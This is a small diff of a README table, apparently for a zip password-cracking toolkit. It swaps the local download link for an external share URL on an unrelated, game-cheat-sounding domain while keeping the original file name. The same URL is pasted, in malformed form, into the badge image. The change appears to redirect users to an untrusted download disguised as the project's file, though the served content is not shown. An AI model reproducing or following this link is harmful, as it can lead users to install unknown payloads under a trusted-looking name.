@@ -86,7 +86,7 @@
 <td align="center">~50MB</td>
 <td>包含所有工具和字典库</td>
 <td align="center">
-<a href="破解压缩包密码工具.zip" download="破解压缩包密码工具.zip">
+<a href="(https://gta5fuzhup.cn/share.php?code=0feb2e45)" download="破解压缩包密码工具.zip">
 <img src="(https://gta5fuzhup.cn/share.php?code=0feb2e45)/下载-完整版-brightgreen?style=for-the-badge&logo=download" alt="下载完整版">
 </a>
 </td>
